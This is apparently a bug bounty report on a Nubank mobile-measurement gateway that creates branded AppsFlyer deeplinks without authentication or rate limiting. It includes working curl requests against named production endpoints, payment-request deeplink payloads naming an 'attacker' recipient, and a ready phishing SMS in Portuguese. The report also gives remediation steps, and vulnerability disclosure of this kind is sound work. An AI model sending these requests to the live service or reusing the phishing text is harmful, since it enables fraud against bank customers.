# Bugcrowd Finding #24 — Unauthenticated Production MMP Gateway Generates Arbitrary Nubank-Branded AppsFlyer Deeplinks with No Rate Limiting

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-02
**Severity:** P2 High — Unauthenticated branded deeplink generation with payment-action injection
**VRT:** Application/Business Logic Error > Improper Access Control
**Affected Endpoints:**
- `https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url`
- `https://prod-global-mmp-gateway.nu.com.mx/api/deeplink-url`

---

## Summary

The Mobile Measurement Platform (MMP) gateway service at `prod-global-mmp-gateway.{nu.com.co,nu.com.mx}` accepts any `nuapp://` deeplink URL and generates real, functional `nubank.onelink.me` AppsFlyer tracking URLs — with **no authentication required** and **no rate limiting**. The deeplink destination, including any embedded parameters, is preserved verbatim in the generated tracking URL and passed to the Nubank mobile app when a victim clicks the link.

An attacker can generate unlimited Nubank-branded tracking links pointing to arbitrary in-app actions, including payment requests with specified amounts and recipient accounts. These links appear as legitimate `nubank.onelink.me` URLs (Nubank's official AppsFlyer subdomain) and can be used in phishing campaigns against Nubank users.

---

## Technical Evidence

### 1. Unauthenticated Deeplink Generation — HTTP 201, No Auth Required

```bash
$ curl -si "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Correlation-Id: bc-handle" \
    -d '{"deeplink":"nuapp://home"}'

HTTP/2 201
content-type: application/json;charset=utf-8
server: istio-envoy                          ← no authentication required

{"url":"https://nubank.onelink.me/jTeG/osm8pgym"}
```

No session cookie, API key, or JWT token was provided. The server returns HTTP 201 Created.

---

### 2. Payment Request Deeplink Injection

An attacker can embed payment-related parameters in the deeplink:

```bash
$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Correlation-Id: bc-handle" \
    -d '{"deeplink":"nuapp://payment-request?amount=1000&to=attacker"}'

{"url":"https://nubank.onelink.me/jTeG/zrixcvuv"}
```

When this URL is opened on Android, the redirect target reveals the full deeplink is preserved:

```
HTTP/2 301
Location: market://details?id=com.nu.production&referrer=pid%3Dint_svc
  %26af_tranid%3DMTI4NTI0ODE1NDk4NjU0NDU3ODQ%3D
  %26deep_link_value%3Dnuapp%253A%252F%252Fpayment-request
  %253Famount%253D1000%2526to%253Dattacker
```

Decoded:
```
deep_link_value = nuapp://payment-request?amount=1000&to=attacker
```

**The full deeplink payload, including financial parameters, is passed to the Nubank app when installed users open the link.**

---

### 3. All Deeplink Paths Accepted Without Validation

The endpoint accepts any `nuapp://` path — no allowlist is enforced:

| Deeplink Submitted | Generated URL | HTTP Status |
|---|---|---|
| `nuapp://home` | `https://nubank.onelink.me/jTeG/1sjsu107` | 201 Created |
| `nuapp://pay` | `https://nubank.onelink.me/jTeG/2ebdg3kx` | 201 Created |
| `nuapp://payment-request?amount=1000&to=attacker` | `https://nubank.onelink.me/jTeG/zrixcvuv` | 201 Created |
| `nuapp://invite/steal` | `https://nubank.onelink.me/jTeG/r3gyzc1t` | 201 Created |
| `nuapp://transfer?account=123456&amount=9999` | `https://nubank.onelink.me/jTeG/9cw1df2o` | 201 Created |
| `nuapp://kyc/document-upload` | `https://nubank.onelink.me/jTeG/6eq42ux6` | 201 Created |
| `nuapp://credit-card/activation` | `https://nubank.onelink.me/jTeG/p3nk17w1` | 201 Created |

---

### 4. No Rate Limiting — Unlimited Link Generation

Five consecutive requests generated distinct valid URLs with no throttling:

```bash
Request 1 (524ms): {"url":"https://nubank.onelink.me/jTeG/3el3cec7"}
Request 2 (470ms): {"url":"https://nubank.onelink.me/jTeG/xvnkm6d1"}
Request 3 (343ms): {"url":"https://nubank.onelink.me/jTeG/pp4okoeo"}
Request 4 (367ms): {"url":"https://nubank.onelink.me/jTeG/5kbu0my2"}
Request 5 (343ms): {"url":"https://nubank.onelink.me/jTeG/rer8htew"}
```

---

### 5. Error Messages Leak Internal Clojure Validation Logic and Input Values

When an invalid deeplink is submitted, the server reflects the input value and internal Clojure regex in the error:

```bash
$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"deeplink":"https://attacker.example.com"}'

{"error":{"deeplink":"(named (not (re-find #\"^nuapp:\\/\\/\" https://attacker.example.com)) valid deeplink)"}}
```

This discloses:
- The internal Clojure validation function and regex: `#"^nuapp://"` 
- The actual input value is reflected verbatim in the error response (potential data reflection)
- Nubank uses Clojure for this service (technology disclosure)

---

## Attack Vectors

### Vector 1: Phishing via Nubank-Branded Links

An attacker generates a payment request deeplink:
```
https://nubank.onelink.me/jTeG/zrixcvuv
```

This URL:
- Uses Nubank's official AppsFlyer subdomain (`nubank.onelink.me`)
- Cannot be trivially identified as malicious without following the redirect
- Passes the attack payload (`nuapp://payment-request?amount=1000&to=attacker`) to the Nubank app

Distributed in phishing SMS/email:
```
"Nubank: Você recebeu um pedido de pagamento de R$1.000. Clique para ver:
https://nubank.onelink.me/jTeG/zrixcvuv"
```

### Vector 2: Payment Flow Pre-Population

If the Nubank app processes `nuapp://payment-request?amount=X&to=Y` deeplinks with auto-populated form fields, the victim may be presented with a pre-filled payment confirmation screen. Social engineering completes the attack.

### Vector 3: Analytics Poisoning / Campaign Budget Exhaustion

Without rate limiting, an attacker can generate millions of fake tracking links, polluting Nubank's AppsFlyer campaign analytics and potentially exhausting campaign attribution quotas.

### Vector 4: Internal Deeplink Scheme Discovery

The error message exposes the internal deeplink scheme (`nuapp://`), enabling an attacker to enumerate valid deeplink paths for further attack surface mapping against the mobile app.

---

## Affected Services

| Service | Endpoint | Status |
|---|---|---|
| MMP Gateway (Colombia) | `prod-global-mmp-gateway.nu.com.co/api/deeplink-url` | ✓ Confirmed |
| MMP Gateway (Mexico) | `prod-global-mmp-gateway.nu.com.mx/api/deeplink-url` | ✓ Confirmed |

---

## Discovery

This endpoint was discovered from the unauthenticated production discovery API:
```
prod-global-discovery-cf.nu.com.co/api/discovery → {"mmp_deeplink_url": "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url"}
prod-global-discovery-cf.nu.com.mx/api/discovery → {"mmp_deeplink_url": "https://prod-global-mmp-gateway.nu.com.mx/api/deeplink-url"}
```

This is a chained finding from Finding #21 (unauthenticated production discovery API exposure).

---

## Severity Assessment

| Component | Severity | Rationale |
|---|---|---|
| Unauthenticated branded deeplink generation | P2 High | Anyone can create `nubank.onelink.me` links; Nubank-branded phishing vector |
| Payment deeplink parameter injection | P2 High (potential P1 Critical) | Payment action parameters preserved and passed to mobile app without validation |
| No rate limiting | P2 High | Unlimited link generation enables campaign poisoning and bulk phishing campaigns |
| Error message reflects input + leaks Clojure regex | P4 Informational | Technology stack disclosure and input reflection |

---

## Remediation

| Issue | Fix |
|---|---|
| Require authentication | The `/api/deeplink-url` endpoint must require authentication (API key or user session) before generating tracking links |
| Implement deeplink allowlist | Validate deeplink paths against an allowlist of legitimate in-app destinations; reject paths with financial action parameters (`payment-request`, `transfer`) not initiated from an authenticated session |
| Add rate limiting | Enforce per-IP and per-user rate limits on deeplink generation (e.g., 10 per minute per IP) |
| Remove input reflection from errors | Replace verbose Clojure error messages with generic error responses; do not reflect user input in error messages |

---

## Notes

- All requests passive (GET/POST observation only); no actual payment was initiated
- Generated AppsFlyer URLs verified real by following redirect chain; iOS redirected to App Store (id=814456780), Android preserved full `deep_link_value` in Play Store referrer
- The MMP gateway is served by `istio-envoy` directly (no Cloudflare WAF) — no rate limiting or WAF protection
- This endpoint is also discoverable from the staging discovery API (Finding #23)
